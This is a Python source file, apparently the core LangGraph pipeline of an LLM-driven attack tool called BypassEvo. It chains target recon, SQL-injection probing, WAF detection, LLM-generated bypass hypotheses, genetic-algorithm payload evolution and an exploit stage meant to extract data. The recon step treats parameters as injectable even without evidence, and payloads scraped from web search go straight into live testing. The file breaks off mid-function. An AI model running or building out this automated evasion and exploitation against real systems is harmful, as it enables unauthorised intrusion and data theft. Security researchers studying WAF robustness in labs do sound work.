"""
BypassEvo LangGraph State Machine — v3.0 Two-Stage Pipeline

Stage 1 — WAF Bypass:
  recon → waf_detect → bypass_generate → bypass_execute → [block_analyze → hypothesis_refine → ga_bypass_evolve → bypass_generate]
                                                           [bypass_success → stage transition]

Stage 2 — Exploit:
  exploit_generate → exploit_execute → [ga_exploit_evolve → exploit_generate]
                                        [exploit_success → done]

Hypothesis-driven bypass: LLM proposes bypass hypotheses (mechanisms), GA explores within each hypothesis space.
Failed hypotheses are refined or discarded; successful ones are deepened.

Uses conditional edges for automatic stage transitions.
"""

from __future__ import annotations

import asyncio
import uuid
import random
import re
import traceback
from typing import Literal, TypedDict

from langgraph.graph import StateGraph, END

from agents.orchestrator import OrchestratorAgent
from agents.generator import GeneratorAgent
from agents.executor import ExecutorAgent
from agents.reflector import ReflectorAgent
from agents.mutator import MutatorAgent
from tools.scanner import Scanner, ScanResult
from tools.memory import AttackMemory, MemoryEntry, _NoOpMemory
from tools.payload_mutator import GeneticEngine, Individual, FitnessEvaluator
from tools.waf_detector import WAFDetector, WAFResult
from tools.waf_analyzer import WAFBlockAnalyzer
from tools.rule_inference_engine import RuleInferenceEngine
from tools.proxy_bridge import import_from_proxy, ProxyRequest
from tools.sql_error_kb import get_kb
from tools.web_search import WAFBypassSearcher, format_search_results_for_prompt
from tools.browser_analyzer import BrowserAnalyzer
from config import BypassEvoConfig, RateLimitConfig
from llm import LLMClient


# ── State ──────────────────────────────────────────────────────────────


class AttackState(TypedDict, total=False):
    # ── Two-stage pipeline ───────────────────────────────────────────
    stage: str                    # "bypass" | "exploit"
    block_analysis: dict          # Latest WAFBlockAnalyzer result
    bypass_success: bool          # True when a payload passes WAF
    bypass_payload: str           # The payload that bypassed the WAF
    bypass_technique: str         # The technique used
    bypass_techniques: list       # All discovered bypass techniques
    bypass_history: list          # History of bypass attempts
    block_history: list           # History of block analysis results

    # ── Core ─────────────────────────────────────────────────────────
    phase: str
    vuln_type: str
    target_url: str
    endpoint: str
    param: str
    method: str

    # ── Extra POST params ────────────────────────────────────────────
    extra_params: dict

    # ── Multi-target ─────────────────────────────────────────────────
    targets: list[dict]
    active_target_idx: int
    target_results: list[dict]

    # ── Recon ────────────────────────────────────────────────────────
    recon_data: dict
    proxy_history: list[dict]

    # ── Injection Point Fingerprint ──────────────────────────────────
    injection_fingerprint: dict   # {is_injectable, quote_type, closure_char, comment_style, dbms_hint, confidence}

    # ── WAF ──────────────────────────────────────────────────────────
    waf_result: dict

    # ── GA population ────────────────────────────────────────────────
    population: list[dict]
    ga_generation: int
    ga_stats: dict
    ga_history: list[dict]

    # ── Payloads ─────────────────────────────────────────────────────
    current_payloads: list[dict]
    current_payload: str
    payload_index: int

    # ── Execution ────────────────────────────────────────────────────
    execution_result: dict
    success: bool

    # ── Reflection ───────────────────────────────────────────────────
    reflection: dict

    # ── Evolution tracking ───────────────────────────────────────────
    iteration: int
    max_iterations: int
    history: list[dict]
    evolution_tree: dict

    # ── Memory ───────────────────────────────────────────────────────
    memory_stats: dict

    # ── Log ──────────────────────────────────────────────────────────
    log: list[str]

    # ── Report ───────────────────────────────────────────────────────
    report: str

    # ── Rate limit status ────────────────────────────────────────────
    rate_limit_status: dict

    # ── Connection error tracking ────────────────────────────────────
    connection_errors: int        # Consecutive connection failures

    # ── Baseline response (for fitness evaluation) ──────────────────
    baseline_snippet: str         # Benign baseline response body for comparison

    # ── Smart stopping ──────────────────────────────────────────────
    consecutive_server_errors: int  # Consecutive 5xx responses
    consecutive_very_low: int       # Consecutive fitness < 0.3 (independent of rotation counter)
    stop_reason: str                # Why attack stopped: "server_errors" | "low_fitness_stall" | "max_iterations" | ""
    paused: bool                    # True when auto-paused (user can resume)

    # ── Strategy rotation tracking ───────────────────────────────────
    consecutive_low_fitness: int  # Consecutive exploit attempts with fitness < 0.4
    current_strategy: str         # Current exploit strategy: "error" | "union" | "blind"

    # ── Extracted data (from successful exploit) ────────────────────
    extracted_data: str           # Data extracted by successful exploit (LLM-confirmed)

    # ── Recon deep analysis ──────────────────────────────────────────
    recon_report: str             # Human-readable recon summary
    current_analysis: str         # Current analysis of latest response (for frontend)
    recommended_strategy: str     # Strategy recommended by recon: "error"|"union"|"blind"|"time"

    # ── Fast mode tracking ───────────────────────────────────────────
    blocked_payload_count: int    # Number of blocked payloads seen (for skip_analyzer_first_n)

    # ── Web search results ───────────────────────────────────────────
    web_search_results: str       # Formatted online research results for LLM prompt

    # ── Strategy plan (LLM-decided) ──────────────────────────────────
    strategy_plan: dict           # LLM strategy decision: agent_count, strategies, etc.

    # ── Hypothesis-driven bypass ─────────────────────────────────────
    hypotheses: list              # Active bypass hypotheses from LLM
    hypothesis_history: list      # History of hypothesis test results
    inferred_rules: list          # WAF rules inferred from 403 response analysis
    reasoning_chain: dict         # LLM's reasoning about WAF detection principles


# ── Helpers ────────────────────────────────────────────────────────────


def _serialize_individual(ind: Individual) -> dict:
    return {
        "payload": ind.payload, "fitness": ind.fitness,
        "generation": ind.generation, "id": ind.id,
        "parent_id": ind.parent_id,
        "mutations_applied": ind.mutations_applied,
        "response_time": ind.response_time,
        "response_code": ind.response_code,
        "response_snippet": ind.response_snippet[:300],
        "indicators": ind.indicators,
        "family": ind.family,
        "hypothesis_id": ind.hypothesis_id,
    }


def _deserialize_individual(d: dict) -> Individual:
    ind = Individual(payload=d["payload"])
    ind.fitness = d.get("fitness", 0)
    ind.generation = d.get("generation", 0)
    ind.parent_id = d.get("parent_id", "")
    ind.mutations_applied = d.get("mutations_applied", [])
    ind.response_time = d.get("response_time", 0)
    ind.response_code = d.get("response_code", 0)
    ind.response_snippet = d.get("response_snippet", "")
    ind.indicators = d.get("indicators", [])
    ind.family = d.get("family", "")
    ind.hypothesis_id = d.get("hypothesis_id", "")
    return ind


def _classify_bypass_fitness(
    evaluator: FitnessEvaluator,
    ind: Individual,
    baseline_status: int = 200,
) -> float:
    """Bypass-mode fitness: passed WAF = high base, then bonus for exploit signals."""
    base = 0.6
    exploit_score = evaluator.evaluate(ind, "sqli")
    return min(base + 0.4 * exploit_score, 1.0)


def _assign_family(payloads: list[dict]) -> list[dict]:
    """Ensure every payload has a 'family' field, inferring from type/content if missing."""
    for p in payloads:
        if p.get("family") or p.get("technique"):
            # Already has family — normalize to 'family' key
            if not p.get("family") and p.get("technique"):
                p["family"] = p["technique"]
            continue
        # Infer from type field
        ptype = p.get("type", "").lower()
        if "comment" in ptype:
            p["family"] = "comment_injection"
        elif "encod" in ptype:
            p["family"] = "encoding"
        elif "case" in ptype:
            p["family"] = "case_variation"
        elif "whitespace" in ptype or "newline" in ptype:
            p["family"] = "whitespace"
        elif "union" in ptype:
            p["family"] = "union_based"
        elif "time" in ptype or "blind" in ptype:
            p["family"] = "time_based"
        elif "error" in ptype:
            p["family"] = "error_based"
        elif "boolean" in ptype:
            p["family"] = "boolean_blind"
        elif "rag" in ptype or "kb" in ptype:
            p["family"] = "kb_seed"
        elif "ga" in ptype:
            p["family"] = "ga_evolved"
        # Infer from payload content
        payload_str = p.get("payload", "")
        if not p.get("family"):
            if "/**/" in payload_str or "/*!" in payload_str:
                p["family"] = "comment_injection"
            elif "%27" in payload_str or "%25" in payload_str or "0x27" in payload_str:
                p["family"] = "encoding"
            elif "%09" in payload_str or "%0a" in payload_str or "%0d" in payload_str:
                p["family"] = "whitespace"
            elif payload_str != payload_str.lower() and payload_str != payload_str.upper() and any(kw in payload_str.upper() for kw in ["SELECT", "UNION", "AND", "OR"]):
                p["family"] = "case_variation"
            else:
                p["family"] = "default"
    return payloads


def _normalize_llm_payloads(result, fallback_payloads: list[dict] | None = None) -> list[dict]:
    """Normalize LLM output to a list of payload dicts.

    Handles all edge cases:
    - result is a dict with "payloads" key (expected)
    - result is a list directly (LLM returned array)
    - result is a dict without "payloads" key
    - result has parse_error
    - result is None or empty
    """
    if result is None:
        return fallback_payloads or []

    # If result is a list (LLM returned array directly)
    if isinstance(result, list):
        normalized = []
        for item in result:
            if isinstance(item, dict):
                normalized.append(item)
            elif isinstance(item, str):
                normalized.append({"payload": item, "type": "llm", "reasoning": "direct string"})
        return normalized or (fallback_payloads or [])

    # If result is a dict
    if isinstance(result, dict):
        # Check for parse error
        if "parse_error" in result or "raw_response" in result:
            return fallback_payloads or []

        # Extract payloads list
        payloads = result.get("payloads", [])
        if isinstance(payloads, list):
            normalized = []
            for item in payloads:
                if isinstance(item, dict):
                    normalized.append(item)
                elif isinstance(item, str):
                    normalized.append({"payload": item, "type": "llm", "reasoning": "direct string"})
            return normalized or (fallback_payloads or [])

    return fallback_payloads or []


def _llm_generate_with_retry(llm: LLMClient, system_prompt: str, user_prompt: str, max_retries: int = 2) -> dict:
    """Call LLM with retry and strict normalization. Always returns a dict."""
    import json as _json

    for attempt in range(max_retries + 1):
        try:
            result = llm.generate_json(system_prompt, user_prompt)

            # If result is a list, wrap it
            if isinstance(result, list):
                return {"payloads": result}

            # If result is a dict, return it
            if isinstance(result, dict):
                if "parse_error" in result and attempt < max_retries:
                    continue  # Retry on parse error
                return result

            # Fallback
            return {"raw_response": str(result)}

        except Exception as e:
            if attempt < max_retries:
                continue
            return {"error": str(e), "parse_error": True}

    return {"parse_error": True}


# ── Parallel execution helpers ─────────────────────────────────────────


async def _parallel_hypothesis_generate(
    llm: LLMClient,
    hypotheses: list[dict],
    system_prompt: str,
    build_user_prompt_fn,
) -> list[tuple[dict, dict | Exception]]:
    """Run LLM payload generation for each hypothesis concurrently.

    Returns list of (hypothesis, result_or_exception) tuples.
    """
    async def _gen_one(hypothesis: dict) -> dict:
        user_prompt = build_user_prompt_fn(hypothesis)
        return await llm.agenerate_json(system_prompt, user_prompt)

    tasks = [_gen_one(h) for h in hypotheses]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return list(zip(hypotheses, results))


def _run_parallel_hypothesis_generation(
    llm: LLMClient,
    hypotheses: list[dict],
    system_prompt: str,
    build_user_prompt_fn,
) -> list[tuple[dict, dict | Exception]]:
    """Execute parallel hypothesis generation from a worker thread.

    Uses asyncio.run() since LangGraph nodes run in threads without an event loop.
    Falls back to sequential execution if an event loop is already running.
    """
    try:
        asyncio.get_running_loop()
        # Event loop already running — fall back to sequential
        results = []
        for h in hypotheses:
            try:
                user_prompt = build_user_prompt_fn(h)
                result = llm.generate_json(system_prompt, user_prompt)
                results.append((h, result))
            except Exception as e:
                results.append((h, e))
        return results
    except RuntimeError:
        # No running loop — safe to use asyncio.run()
        return asyncio.run(
            _parallel_hypothesis_generate(llm, hypotheses, system_prompt, build_user_prompt_fn)
        )


async def _parallel_rule_inference(
    llm: LLMClient,
    rie: RuleInferenceEngine,
    llm_system_prompt: str,
    llm_user_prompt: str,
    blocked_responses: list[dict],
    passed_responses: list[dict],
    waf_name: str,
) -> tuple:
    """Run LLM inference and RIE concurrently.

    Returns (llm_result_or_exception, rie_result_or_exception).
    """
    llm_task = llm.agenerate_json(llm_system_prompt, llm_user_prompt)
    rie_task = asyncio.to_thread(
        rie.infer_rules_from_responses,
        blocked_responses,
        passed_responses,
        waf_name,
    )
    results = await asyncio.gather(llm_task, rie_task, return_exceptions=True)
    return results[0], results[1]


def _run_parallel_rule_inference(
    llm: LLMClient,
    rie: RuleInferenceEngine,
    llm_system_prompt: str,
    llm_user_prompt: str,
    blocked_responses: list[dict],
    passed_responses: list[dict],
    waf_name: str,
) -> tuple:
    """Execute parallel rule inference from a worker thread.

    Falls back to sequential execution if an event loop is already running.
    """
    try:
        asyncio.get_running_loop()
        # Fallback: sequential execution
        try:
            llm_result = llm.generate_json(llm_system_prompt, llm_user_prompt)
        except Exception as e:
            llm_result = e
        try:
            rie_result = rie.infer_rules_from_responses(
                blocked_responses, passed_responses, waf_name
            )
        except Exception as e:
            rie_result = e
        return llm_result, rie_result
    except RuntimeError:
        # No running loop — safe to use asyncio.run()
        return asyncio.run(
            _parallel_rule_inference(
                llm, rie, llm_system_prompt, llm_user_prompt,
                blocked_responses, passed_responses, waf_name,
            )
        )


def _merge_rules(llm_rules: list[dict], rie_rules: list[dict]) -> list[dict]:
    """Merge rules from LLM and RIE, deduplicating by (rule_type, trigger_keywords).

    When duplicates exist, keep the one with higher confidence.
    """
    merged = {}
    for rule in llm_rules + rie_rules:
        key = (rule.get("rule_type", ""), tuple(sorted(rule.get("trigger_keywords", []))))
        existing = merged.get(key)
        if existing is None or rule.get("confidence", 0) > existing.get("confidence", 0):
            merged[key] = rule
    return list(merged.values())


# ── Node functions ─────────────────────────────────────────────────────


def make_recon_node(scanner: Scanner, proxy_cfg=None, memory: AttackMemory = None, fast_mode: bool = False):
    def recon(state: AttackState) -> dict:
        try:
            log = list(state.get("log", []))
            if fast_mode:
                log.append("[RECON] Scanning target (FAST MODE)...")
            else:
                log.append("[RECON] Scanning target...")

            endpoint = state.get("endpoint", "/")
            param = state.get("param", "id")
            method = state.get("method", "GET")

            # Step 0: Connection check
            conn = scanner.check_connection(endpoint)
            if not conn["ok"]:
                log.append(f"[RECON] CONNECTION FAILED: {conn['error']} — {conn['detail']}")
                log.append("[RECON] Target unreachable. Check that docker-compose is running.")
                return {
                    "recon_data": {"connection_error": conn},
                    "proxy_history": [],
                    "phase": "done",
                    "log": log,
                    "injection_fingerprint": {"is_injectable": False, "quote_type": "unknown",
                                              "connection_error": True, "error_detail": conn['detail']},
                    "recon_report": f"CONNECTION FAILED: {conn['error']}",
                    "current_analysis": f"Target unreachable: {conn['detail']}",
                }

            # Step 1: Basic recon
            data = scanner.recon(endpoint)
            log.append(f"[RECON] Status={data.get('status')}, forms={len(data.get('forms', []))}")

            baseline = scanner.capture_baseline(endpoint)
            log.append(f"[RECON] Baseline: status={baseline.status_code}, len={baseline.body_length}, time={baseline.response_time:.2f}s")

            # Step 2: Injection point discovery (lightweight in fast mode)
            if fast_mode:
                log.append(f"[RECON] Quick probing injection point: {method} ?{param}= ...")
                probe_result = scanner.probe_injection_point(endpoint, param, method)
                fingerprint = {
                    **probe_result,
                    "recon_report": f"Quick probe: injectable={probe_result['is_injectable']}, quote={probe_result['quote_type']}",
                    "recommended_strategy": "error",
                    "sql_error_evidence": [],
                    "data_leak_evidence": [],
                    "response_analyses": [],
                }
            else:
                log.append(f"[RECON] Deep probing injection point: {method} ?{param}= ...")
                fingerprint = scanner.deep_recon(endpoint, param, method)

            # Build recon report
            recon_report_lines = []
            if fingerprint["is_injectable"]:
                log.append(f"[RECON] INJECTABLE! quote_type={fingerprint['quote_type']}, "
                           f"closure='{fingerprint['closure_char']}', "
                           f"dbms={fingerprint['dbms_hint']}, "
                           f"confidence={fingerprint['confidence']:.2f}")
                recon_report_lines.append(
                    f"INJECTABLE: quote={fingerprint['quote_type']}, "
                    f"closure='{fingerprint['closure_char']}', dbms={fingerprint['dbms_hint']}, "
                    f"confidence={fingerprint['confidence']:.0%}"
                )

                # Log SQL errors found
                sql_errors = fingerprint.get("sql_error_evidence", [])
                if sql_errors:
                    log.append(f"[RECON] SQL errors detected: {', '.join(sql_errors[:5])}")
                    recon_report_lines.append(f"SQL errors: {', '.join(sql_errors[:5])}")

                # Log data leak signals
                data_leaks = fingerprint.get("data_leak_evidence", [])
                if data_leaks:
                    leak_patterns = [d["pattern"] for d in data_leaks[:5]]
                    log.append(f"[RECON] Data leak signals: {', '.join(leak_patterns)}")
                    recon_report_lines.append(f"Data leaks: {', '.join(leak_patterns)}")

                # Log test details
                for tr in fingerprint.get("test_results", []):
                    if tr.get("has_sql_error") or tr.get("confirmed") or tr.get("is_500"):
                        log.append(f"  -> {tr['probe']}: {'SQL error' if tr.get('has_sql_error') else ''}"
                                   f"{'500' if tr.get('is_500') else ''}"
                                   f"{'Boolean confirmed' if tr.get('confirmed') else ''}")
            else:
                # Even if not injectable, check if we found SQL errors
                sql_errors = fingerprint.get("sql_error_evidence", [])
                if sql_errors:
                    log.append(f"[RECON] Standard probes failed BUT SQL errors detected: {', '.join(sql_errors[:3])}")
                    log.append("[RECON] Marking as LIKELY INJECTABLE — will attempt exploitation.")
                    recon_report_lines.append(f"LIKELY INJECTABLE: SQL errors found despite probe failure")
                    recon_report_lines.append(f"SQL errors: {', '.join(sql_errors[:5])}")
                else:
                    # Give benefit of the doubt — even for generic params, proceed
                    # WAF may be blocking the probes themselves
                    likely_params = ("id", "user", "name", "item", "cat", "page", "uid", "pid", "file", "news", "article")
                    if param and (param not in ("q", "search", "query") or param in likely_params):
                        fingerprint["is_injectable"] = True
                        fingerprint["confidence"] = max(fingerprint.get("confidence", 0), 0.40)
                        log.append(f"[RECON] Standard probes did not confirm, but param '{param}' is a classic injection target.")
                        log.append("[RECON] Marking as LIKELY INJECTABLE — will attempt exploitation.")
                        recon_report_lines.append(f"LIKELY INJECTABLE: param '{param}' — proceeding with exploitation")
                    else:
                        fingerprint["is_injectable"] = True
                        fingerprint["confidence"] = max(fingerprint.get("confidence", 0), 0.30)
                        log.append(f"[RECON] No clear injection signal with param '{param}'.")
                        log.append("[RECON] Proceeding anyway — WAF may be blocking probes.")
                        recon_report_lines.append("No clear injection signal. Proceeding with WAF bypass.")

            # Log recommended strategy
            recommended = fingerprint.get("recommended_strategy", "unknown")
            if recommended != "unknown":
                log.append(f"[RECON] Recommended strategy: {recommended.upper()}")
                recon_report_lines.append(f"Strategy: {recommended.upper()}")

            recon_report = " | ".join(recon_report_lines) if recon_report_lines else "Recon completed."

            # Step 3: Proxy history import
            proxy_history = []
            if proxy_cfg and proxy_cfg.source != "none":
                log.append(f"[RECON] Importing proxy history ({proxy_cfg.source})...")
                try:
                    proxy_requests = import_from_proxy(
                        source=proxy_cfg.source,
                        burp_url=proxy_cfg.burp_url,
                        zap_url=proxy_cfg.zap_url,
                        zap_key=proxy_cfg.zap_api_key,
                        burp_xml=proxy_cfg.burp_xml_path,
                    )
                    proxy_history = [
                        {"url": r.url, "method": r.method, "params": r.params, "cookies": r.cookies}
                        for r in proxy_requests
                    ]
                    log.append(f"[RECON] Imported {len(proxy_history)} requests from proxy")
                except Exception as e:
                    log.append(f"[RECON] Proxy import failed: {e}")

            # Step 4: RAG memory lookup
            if memory:
                vuln_type = state.get("vuln_type", "sqli")
                try:
                    similar = memory.query_similar(
                        payload=f"{vuln_type} {endpoint}",
                        vuln_type=vuln_type,
                        n_results=3,
                    )
                    if similar:
                        log.append(f"[RAG] Found {len(similar)} similar past attempts in memory")
                        for s in similar:
                            log.append(f"  -> [{s['result']}] {s['payload'][:50]} (sim={s['similarity']:.2f})")
                except Exception as e:
                    log.append(f"[RAG] Memory query failed: {e}")

            # Build current_analysis for frontend
            current_analysis = fingerprint.get("recon_report", recon_report)

            return {
                "recon_data": data,
                "proxy_history": proxy_history,
                "phase": "waf_detect",
                "log": log,
                "injection_fingerprint": fingerprint,
                "recon_report": recon_report,
                "current_analysis": current_analysis,
                "recommended_strategy": recommended,
                "current_strategy": recommended if recommended != "unknown" else "error",
                "baseline_snippet": baseline.body if hasattr(baseline, 'body') else "",
            }
        except Exception as e:
            log = list(state.get("log", []))
            log.append(f"[ERROR] Recon failed: {e}")
            return {"phase": "waf_detect", "log": log, "recon_data": {}, "proxy_history": [],
                    "injection_fingerprint": {"is_injectable": False, "quote_type": "unknown"},
                    "recon_report": f"Recon error: {e}",
                    "current_analysis": f"Recon failed: {e}"}
    return recon


def make_waf_detect_node(base_url: str, timeout: int = 8, php_sessid: str = ""):
    def waf_detect(state: AttackState) -> dict:
        try:
            log = list(state.get("log", []))
            log.append("[WAF] Probing for WAF...")

            detector = WAFDetector(timeout=timeout, php_sessid=php_sessid)
            result = detector.detect(base_url, state.get("endpoint", "/"))

            if result.detected:
                log.append(f"[WAF] DETECTED: {result.waf_name} (confidence={result.confidence:.2f})")
                log.append(f"[WAF] Bypass strategies: {result.bypass_strategies}")
                log.append("[STAGE] Entering Stage 1: WAF Bypass")
            else:
                log.append("[WAF] No WAF detected — skipping to Stage 2: Exploit")
                log.append("[STAGE] Entering Stage 2: Exploit (no WAF)")

            next_phase = "bypass_generate" if result.detected else "exploit_generate"
            next_stage = "bypass" if result.detected else "exploit"

            return {
                "waf_result": {
                    "detected": result.detected,
                    "waf_name": result.waf_name,
                    "confidence": result.confidence,
                    "indicators": result.indicators,
                    "bypass_strategies": result.bypass_strategies,
                },
                "phase": next_phase,
                "stage": next_stage,
                "log": log,
            }
        except Exception as e:
            log = list(state.get("log", []))
            log.append(f"[ERROR] WAF detection failed: {e}")
            # Default to bypass stage on error
            return {
                "waf_result": {"detected": True, "waf_name": "unknown", "confidence": 0.5, "indicators": [], "bypass_strategies": []},
                "phase": "bypass_generate",
                "stage": "bypass",
                "log": log,
            }
    return waf_detect


# ── Stage 1: Bypass Nodes ──────────────────────────────────────────────


def make_bypass_generate_node(
    generator: GeneratorAgent,
    llm: LLMClient,
    memory: AttackMemory = None,
    searcher: WAFBypassSearcher = None,
    scanner: Scanner = None,
):
    """Generate payloads focused on WAF bypass."""
    def bypass_generate(state: AttackState) -> dict:
        try:
            log = list(state.get("log", []))
            search_seed_payloads = []  # Will be populated by web search if available
            reasoning_chain = state.get("reasoning_chain", {})
            iteration = state.get("iteration", 0)
            ga_gen = state.get("ga_generation", 0)
            waf = state.get("waf_result", {})
            block = state.get("block_analysis", {})
            web_search_text = ""
            strategy_plan = state.get("strategy_plan")

            # ── Hypothesis generation (first time after block analysis) ──
            hypotheses = list(state.get("hypotheses", []))
            hypothesis_history = list(state.get("hypothesis_history", []))
            block = state.get("block_analysis", {})

            if not hypotheses and block and block.get("rule_inference"):
                # First time we have block analysis — generate hypotheses
                try:
                    from prompts import HYPOTHESIS_GENERATOR_PROMPT
                    import json

                    waf = state.get("waf_result", {})
                    waf_name = waf.get("waf_name", "unknown")
                    fp = state.get("injection_fingerprint", {})

                    kb_ctx = ""
                    if memory:
                        try:
                            kb_entries = memory.query_knowledge(waf_name=waf_name, vuln_type=state.get("vuln_type", "sqli"), top_k=5)
                            if kb_entries:
                                kb_lines = []
                                for e in kb_entries:
                                    sc = e.get("success_count", 0)
                                    fc = e.get("fail_count", 0)
                                    conf = e.get("confidence", 0)
                                    kb_lines.append(f"  - {e['technique']}: success={sc} fail={fc} confidence={conf:.2f} payload={e.get('payload_example', '')[:60]}")
                                kb_ctx = "\n".join(kb_lines)
                        except Exception:
                            pass

                    # ── Step 3: Feed inferred rules + past hypothesis results ──
                    inferred_rules = state.get("inferred_rules", [])
                    if inferred_rules:
                        rules_lines = ["Inferred WAF rules from 403 response analysis:"]
                        for r in inferred_rules:
                            kws = r.get("trigger_keywords", [])[:5]
                            rules_lines.append(
                                f"  - {r.get('rule_type', '?')} (conf={r.get('confidence', 0):.2f}): "
                                f"triggers=[{', '.join(kws)}] | {r.get('evidence', '')[:80]}"
                            )
                        kb_ctx = (kb_ctx + "\n" if kb_ctx else "") + "\n".join(rules_lines)

                    # Past hypothesis results from knowledge base
                    if memory:
                        try:
                            past_hyps = memory.query_hypothesis_results(waf_name=waf_name, top_k=5)
                            if past_hyps:
                                hyp_lines = ["Past hypothesis results for this WAF:"]
                                for ph in past_hyps:
                                    hyp_lines.append(
                                        f"  - {ph['mechanism']}: action={ph['action']} "
                                        f"fitness={ph.get('best_fitness', 0):.3f} "
                                        f"tests={ph.get('test_count', 0)} "
                                        f"bypasses={ph.get('bypass_count', 0)} "
                                        f"| {ph.get('reasoning', '')[:60]}"
                                    )
                                kb_ctx = (kb_ctx + "\n" if kb_ctx else "") + "\n".join(hyp_lines)
                        except Exception:
                            pass

                    hyp_prompt = HYPOTHESIS_GENERATOR_PROMPT.format(
                        waf_name=waf_name,
                        vuln_type=state.get("vuln_type", "sqli"),
                        block_analysis=json.dumps(block, default=str)[:500],
                        fingerprint=json.dumps(fp, default=str)[:300],
                        bypass_history=json.dumps(state.get("bypass_history", [])[-5:], default=str),
                        hypothesis_history=json.dumps(hypothesis_history[-3:], default=str),
                        kb_techniques=kb_ctx or "none",
                        web_search_results=web_search_text[:300] if web_search_text else "none",
                        strategy_plan=json.dumps(strategy_plan) if strategy_plan else "none",
                    )
                    hyp_result = _llm_generate_with_retry(llm, hyp_prompt, "Generate bypass hypotheses now.")

                    if isinstance(hyp_result, dict) and "hypotheses" in hyp_result:
                        raw_hyps = hyp_result["hypotheses"]
                        if isinstance(raw_hyps, list):
                            for h in raw_hyps:
                                if isinstance(h, dict) and h.get("mechanism"):
                                    h.setdefault("status", "active")
                                    h.setdefault("test_count", 0)
                                    h.setdefault("best_fitness", 0.0)
                                    h.setdefault("bypass_count", 0)
                            hypotheses = [h for h in raw_hyps if isinstance(h, dict) and h.get("mechanism")]
                            # Store reasoning chain for frontend display
                            reasoning_chain = hyp_result.get("reasoning_chain", {})
                            if reasoning_chain:
                                log.append(f"[HYPOTHESIS] Reasoning chain: detection={reasoning_chain.get('waf_detection_method', 'unknown')[:60]}")
                            log.append(f"[HYPOTHESIS] Generated {len(hypotheses)} hypotheses:")
                            for h in hypotheses:
                                log.append(f"  -> [{h['mechanism']}] conf={h.get('confidence', 0):.2f} | {h.get('description', '')[:60]}")
                except Exception as e:
                    log.append(f"[HYPOTHESIS] Generation failed: {e}")

            # If GA has evolved, use evolved population
            population = state.get("population", [])
            if population and ga_gen > 0:
                payloads = [
                    {"payload": d["payload"], "type": "ga_bypass",
                     "reasoning": f"GA bypass gen {ga_gen}",
                     "family": d.get("family", ""),
                     "technique": d.get("family", ""),
                     "hypothesis_id": d.get("hypothesis_id", "")}
                    for d in population
                ]
                # Deduplicate payloads — GA may produce identical individuals
                seen = set()
                unique_payloads = []
                for p in payloads:
                    if p["payload"] not in seen:
                        seen.add(p["payload"])
                        unique_payloads.append(p)
                if len(unique_payloads) < len(payloads):
                    log.append(f"[BYPASS-GEN] Deduplicated: {len(payloads)} -> {len(unique_payloads)} unique payloads")
                payloads = unique_payloads
                log.append(f"[BYPASS-GEN] Using GA population ({len(payloads)}, gen {ga_gen})")
                # Log family distribution
                fam_counts = {}
                for p in payloads:
                    fam = p.get("family", "") or "default"
                    fam_counts[fam] = fam_counts.get(fam, 0) + 1
                log.append(f"[BYPASS-GEN] Payload families: {fam_counts}")
                for i, p in enumerate(payloads[:3]):
                    log.append(f"[BYPASS-GEN]   [{i}] {p['payload'][:60]}")
            elif block and block.get("rule_inference"):
                rule = block["rule_inference"]
                import json

                bypass_history = state.get("bypass_history", [])
                waf_name = waf.get("waf_name", "unknown")
                is_unknown_waf = waf_name in ("unknown", "none", "")
                browser_analysis = block.get("browser_analysis", "")

                # ── Strategy Decision (run once per WAF) ─────────────────
                strategy_plan = state.get("strategy_plan")
                if not strategy_plan and iteration <= 2:
                    try:
                        from prompts import STRATEGY_DECISION_PROMPT
                        # Collect context for strategy decision
                        kb_ctx = ""
                        if memory:
                            kb_entries = memory.query_knowledge(waf_name=waf_name, vuln_type=state.get("vuln_type", "sqli"), top_k=5)
                            if kb_entries:
                                kb_ctx = "; ".join(f"{e['technique']}({e['confidence']:.1f})" for e in kb_entries)

                        strategy_prompt = STRATEGY_DECISION_PROMPT.format(
                            waf_name=waf_name,
                            vuln_type=state.get("vuln_type", "sqli"),
                            block_analysis=json.dumps(block, default=str)[:300],
                            web_search_results=web_search_text[:300] if web_search_text else "none",
                            kb_techniques=kb_ctx or "none",
                            bypass_history=json.dumps(bypass_history[-3:], default=str),
                        )
                        strategy_result = llm.generate_json(strategy_prompt, "Decide the strategy plan now.")
                        if isinstance(strategy_result, dict) and "strategies" in strategy_result:
                            strategy_plan = strategy_result
                            log.append(f"[STRATEGY] LLM decided: {strategy_plan.get('agent_count', '?')} agents, difficulty={strategy_plan.get('estimated_difficulty', '?')}")
                            for s in strategy_plan.get("strategies", []):
                                log.append(f"  -> {s.get('family', '?')} ({s.get('priority', '?')}): {s.get('reasoning', '')[:60]}")
                    except Exception as e:
                        log.append(f"[STRATEGY] Decision failed: {e}")

                # Online search for known bypass techniques (once per WAF, cached)
                if searcher and iteration <= 1:
                    try:
                        trigger_segs = [s.get("text", "") for s in block.get("trigger_segments", []) if s.get("text")]
                        search_resp = searcher.search(
                            waf_name=waf_name,
                            vuln_type=state.get("vuln_type", "sqli"),
                            trigger_segments=trigger_segs,
                        )
                        web_search_text = format_search_results_for_prompt(search_resp)
                        if search_resp.results:
                            log.append(f"[WEB-SEARCH] Found {len(search_resp.results)} results for {waf_name} ({search_resp.search_time:.1f}s)")
                            # Store discovered techniques in knowledge base (source: web search)
                            if memory:
                                for r in search_resp.results:
                                    if r.payload_example:
                                        memory.add_knowledge(
                                            waf_name=waf_name,
                                            technique=r.technique,
                                            vuln_type=state.get("vuln_type", "sqli"),
                                            payload=r.payload_example,
                                            success=False,  # Unverified from web
                                            confidence=0.3,
                                            source=f"联网搜索: {r.source}",
                                            evidence=r.snippet[:200],
                                        )
                            # Direct injection: search payloads as seeds for immediate testing
                            for r in search_resp.results:
                                if r.payload_example and len(r.payload_example) > 3:
                                    search_seed_payloads.append({
                                        "payload": r.payload_example,
                                        "technique": r.technique or "web_search",
                                        "reasoning": f"From web search: {r.title[:60]}",
                                        "type": "web_search_seed",
                                        "family": r.technique or "web_search",
                                        "hypothesis_id": "",
                                    })
                            if search_seed_payloads:
                                log.append(f"[WEB-SEARCH] Injecting {len(search_seed_payloads)} search payloads as direct seeds")
                    except Exception as e:
                        log.append(f"[WEB-SEARCH] Search failed: {e}")
                        web_search_text = "[Web Search: unavailable]"

                # Use blind prompt for unknown WAFs, standard prompt for known
                if is_unknown_waf and len(bypass_history) >= 2:
                    from prompts import BYPASS_BLIND_PROMPT
                    blocked_payloads = [h.get("payload", "")[:60] for h in bypass_history if h.get("status_code") in (403, 406, 503)]
                    passed_payloads = [h.get("payload", "")[:60] for h in bypass_history if h.get("status_code") not in (403, 406, 503, 0)]
